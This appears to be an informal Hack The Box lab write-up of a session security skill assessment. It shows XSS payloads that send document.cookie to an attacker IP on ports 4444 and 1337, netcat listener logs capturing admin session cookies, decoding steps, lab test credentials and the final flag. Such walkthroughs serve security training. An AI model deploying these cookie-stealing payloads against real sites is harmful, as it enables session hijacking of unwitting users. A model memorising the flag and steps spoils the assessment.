# Sesssion Security - Skill Assessment

The only URL in scope is http://minilab.htb.net
Attacking end-users through client-side attacks is in scope for this particular bug bounty program.

Test account credentials:
> [!IMPORTANT]
> Email: heavycat106
> Password: rocknrol
> Server: http://minilab.htb.net

Through dirbusting, you identified the following endpoint http://minilab.htb.net/submit-solution.

http://minilab.htb.net/app/

Endpoints:

http://minilab.htb.net/submit-solution

`<script>fetch(`http://10.10.14.184:4444?cookie=${btoa(document.cookie)}`)</script>`


nc -nvlp 4444
Connection from 10.10.14.184:38144
GET /?cookie=YXV0aC1zZXNzaW9uPXMlM0FzSkpQYjM1Y2xoZnQtbWlWTmI4YzhTS25wTmJIUE50bC5PTzIzYjFjcGpJNWJmYktkYWxDTnFhUkJjSSUyRjYxZHNoUnNmTW9IeW1yRGM= HTTP/1.1
Host: 10.10.14.184:4444
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: */*
Origin: http://minilab.htb.net
Referer: http://minilab.htb.net/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

We get the cookie:
[YXV0aC1zZXNzaW9uPXMlM0FzSkpQYjM1Y2xoZnQtbWlWTmI4YzhTS25wTmJIUE50bC5PTzIzYjFjcGpJNWJmYktkYWxDTnFhUkJjSSUyRjYxZHNoUnNmTW9IeW1yRGM]

Decode in base64:
[auth-session=s%3AsJJPb35clhft-miVNb8c8SKnpNbHPNtl.OO23b1cpjI5bfbKdalCNqaRBcI%2F61dshRsfMoHymrDc]

adminVisited	true
adminVisitedTimestamp	1749657564749
success	true

 ```js
 <script>const cookies = document.cookie;
const authSession = cookies.split('; ').find(row => row.startsWith('auth-session='));
if (authSession) {
    const authValue = encodeURIComponent(authSession.split('=')[1]);

    fetch(`http://10.10.14.184:1337/?cookie=${authValue}`)
        .then(response => console.log('Cookie sent successfully'))
        .catch(error => console.error('Error sending cookie:', error));
} else {
    console.error('auth-session cookie not found');
}</script>
 ```

 s%253A3lZBrpUccqxGE4j_75VAI0AIBGl4t9Ng.%252B%252Bv4%252FONgmqpgxl5V7vnrtgaMgspn1qJOBtLyk07nIh8

We change the cookie sotorag in minilab.htb.net/submit-solution
After that with nc activate go to the

[Get se sessuion:]
nc -nvlp 1337
Connection from 10.129.196.12:40722
GET /?cookie=s%253AE1zjz94gVYpO9CTQdMQYXrXQ_R4T7_Y6.MZVCsRnA3bRXYbbWJoCijjWz4uqnvahIjWhYBAeLJ0Q HTTP/1.1
Host: 10.10.14.184:1337
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 [64253c4c19f292951ca3e6ce0788ed70dc12274d]
Accept: */*
Origin: http://minilab.htb.net
Referer: http://minilab.htb.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US
---

echo "s%253AE1zjz94gVYpO9CTQdMQYXrXQ_R4T7_Y6.MZVCsRnA3bRXYbbWJoCijjWz4uqnvahIjWhYBAeLJ0Q" | sed 's/%/\\x/g' | xargs -0 echo -e

s%3AE1zjz94gVYpO9CTQdMQYXrXQ_R4T7_Y6.MZVCsRnA3bRXYbbWJoCijjWz4uqnvahIjWhYBAeLJ0Q

paste the cookie and find de superadmin:

FLAG{SUCCESS_YOU_PWN3D_US_H0PE_YOU_ENJ0YED}
